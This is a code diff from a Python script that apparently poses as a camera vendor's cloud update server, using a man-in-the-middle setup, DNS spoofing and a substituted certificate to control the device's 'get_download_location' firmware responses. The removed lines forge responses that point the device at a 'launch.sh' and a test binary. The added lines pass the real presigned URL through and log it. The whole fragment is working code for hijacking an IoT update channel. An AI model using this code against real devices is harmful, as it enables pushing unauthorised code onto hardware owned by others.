@@ -428,28 +428,13 @@ def main() -> int:
                 except Exception:
                     req = {}
                 name = req.get("processname") or ""
-                if "get_download_location" in self.path and os.environ.get("MIRROR"):
-                    # hand out the real presigned URL so the device pulls from S3 and the mirror can
-                    # harvest the bytes; the version echo below is only for our own URLs
+                if "get_download_location" in self.path:
+                    # ALWAYS hand out the real presigned URL (passthrough via the MITM):
+                    # a forged signature (0*64) can be rejected client-side before any fetch,
+                    # while the real URL validates — and the DNS spoof routes the resulting
+                    # fetch to this same forge, which serves the path with our SNI cert.
                     out = passthrough(self.path, body, self.headers)
-                elif "get_download_location" in self.path:
-                    # echo the version the device asked for: it appears to reject a mismatch
-                    asked = req.get("version") or ""
-                    if asked:
-                        if name.startswith("kvs"):
-                            kvs_ver = asked
-                        else:
-                            model_ver = asked
-                    if name.startswith("kvs"):
-                        out = json.dumps({"code": "1", "ts": int(time.time() * 1000), "msg": "SUCCESS",
-                                          "data": {"version": kvs_ver, "url": presigned(kvs_path),
-                                                   "filename": "launch.sh"},
-                                          "traceId": os.urandom(16).hex()}).encode()
-                    else:
-                        out = json.dumps({"code": "1", "ts": int(time.time() * 1000), "msg": "SUCCESS",
-                                          "data": {"version": model_ver, "url": presigned(model_path),
-                                                   "filename": "wyzeedgeai_cam_v4_test_protocol"},
-                                          "traceId": os.urandom(16).hex()}).encode()
+                    print(f"  -> dl-loc {name!r} -> {out[:220]!r}", flush=True)
                 else:
                     # The real answer lists every component with the checksum the device verifies;
                     # a short list never completes an install. Checksums are the cloud's own.
